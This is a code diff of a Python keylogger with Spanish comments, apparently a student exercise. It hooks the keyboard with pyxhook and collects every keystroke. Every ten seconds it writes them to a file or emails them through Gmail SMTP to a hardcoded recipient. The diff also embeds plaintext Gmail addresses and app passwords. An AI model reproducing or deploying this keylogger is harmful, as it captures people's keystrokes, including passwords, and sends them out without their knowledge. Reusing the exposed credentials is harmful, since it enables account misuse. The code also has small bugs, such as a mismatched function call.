@@ -1,69 +1,133 @@
-import pyxhook
+import pyxhook #a mi no me funciono con ese porque mac
+# pero si con este from pynput import keyboard
+#entonces si cambia el codigo poquito
+import threading
 import smtplib
 import time
+import sys
 
 
+# Cambia estos datos a los tuyos
+userMail = "keyloggerp531@gmail.com"
+userPass = "zdhr jzws jqiq zkqf"
+userTo = "sirofatala@gmail.com"
+mailSubject = "Registro de teclas"
+logfile = "keyfile.txt"
+wait_seconds = 10
+guardar_txt = False
+enviar_mail = False
+keys = []
+server = None
 
-respuesta_afirmativa = ("yes", "y")
-userMail = "keylogge111999r@gmial.com"
-userPass = "lpwz sdli wmpv rwqf"
-userTo = "siro@ciencias.unam.mx"
-mailSubject = "Mail de prueba"
-
-wait_seconds = 10 
-timeout = time.time()  
-
-def TimeOut(): 
-    return time.time() > timeout 
 
 def oneKeyEvent(event):
-    with open("keyfile.txt", "a") as logKey: 
-        try: 
-            logKey.write(f"{event.Key}\n")
-            return True
-        except: 
-            return False 
+    tecla = event.Key
+    keys.append(tecla)
+   
+    if tecla == "esc":
+        texto = formatear_tecla()
+        if enviar_mail:
+            enviar_email(texto)
+        print("\n[!] Saliendo del programa.")
+        sys.exit(0)
 
 def callback():
     hm = pyxhook.HookManager()
     hm.KeyDown = oneKeyEvent
     hm.HookKeyboard()
-    hm.start() 
+    hm.start()
+
+
+
+
+
+def formatear_tecla():
+    data = "".join(keys)
+    return data.replace("Space", " ")
     
-def builtEmail(user, passw, recep, subj, body): 
-    mailUser = user 
-    mailPass = passw 
-    From = user 
-    To = recep 
-    Subject = subj 
-    Txt = body 
+
+def guardar_en_archivo():
+    try:
+        with open(logfile, "a") as f:
+            contenido = formatear_tecla()
+            f.write(contenido)
+            print("Texto guardado en archivo.")
+    except Exception as e:
+        print("Error al guardar en archivo:", e)
+
+def config_server(): 
+    global server 
     
-    email = """From: %s\nTo: %s\nSubject: %s\n\n%s """ % (From, ", ".join(To), Subject, Txt)
-    
-    # try: 
-    server=smtplib.SMTP("smtp.gmail.com", 587)
-    server.ehlo()
+    server = smtplib.SMTP("smtp.gmail.com", 587)
     server.starttls()
-    server.login(mailUser, mailPass)
-    server.sendmail(From, To, email)
-    # except: 
-    #     print("Correo Fallido")
+    server.login(userMail, userPass)
+    
+def enviar_email():
+    print("Entro a mail")
+    
+    try:        
+        # server=smtplib.SMTP("smtp.gmail.com", 587)
+        # server.ehlo()
+        # server.starttls()
+        # server.login(userMail, userPass)
+       
+        contenido = formatear_tecla()
+        mensaje = f"Subject: {mailSubject}\n\n{contenido}"
+        server.sendmail(userMail, [userTo], mensaje)
+        print("Lo termino de mandar el mail")
+        print("Correo enviado :)")
         
-def sendEmail(): 
-    with open("keyfile.txt", "r+") as logkey: 
-        data = logkey.read()
-        data = data.replace("Space", " ")
-        data = data .replace("\n", "")
-        builtEmail(userMail,userPass,userTo, mailSubject, data)
-        logkey.seek(0)
-        logkey.truncate
-     
+        
+    except Exception as e:
+        print("Error al enviar el correo :(")
+        import traceback
+        traceback.print_exc()
+
+def revisar():
+    global keys
+    while True:
+        time.sleep(wait_seconds)
+        if keys:
+            if enviar_mail:
+                enviar_email()
+                print("salgo de mandar mail")
+            if guardar_txt:
+                guardar_en_archivo()
+                print("salgo de guardar")
+            keys.clear()
+
+
+
+
+def pregunta(prompt):
+    while True:
+        respuesta = input(prompt).strip().lower()
+        if respuesta == "exit":
+            print("Terminando ejecución")
+            sys.exit(0)
+        if respuesta in ("y"):
+            return True
+        elif respuesta in ("n"):
+            return False
+        else:
+            print("Responde con 'y','n' o 'exit'")
+
 if __name__ == "__main__":
-    # enviar = input("¿Deseas enviar los registros por email?[y/n]") in respuesta_afirmativa  
-    # guardar = input("¿Deseas guardar los registros en texto plano?[y/n]") in respuesta_afirmativa
+    print("Para salir en cualquier pregunta escribe 'exit'.\n")
+
+    enviar_mail = pregunta("¿Deseas enviar los registros por email? [y/n]: ")
+    guardar_txt = pregunta("¿Deseas guardar los registros en texto plano? [y/n]: ")
+
+    if not enviar_mail and not guardar_txt:
+        print("No se seleccionó ninguna acción. El programa se cerrará.")
+        sys.exit(0)
     
+    if enviar_mail:
+        print("config mail")
+        config_server()
+        print("listo congig serrver")
+
+    print("\nIniciando.... Presiona ESC para salir.")
+    t = threading.Thread(target=revisar, daemon=True)
+    t.start()
     callback()
-    
-    if TimeOut(): 
-        sendEmail()
-        timeout = time.time() + wait_seconds 
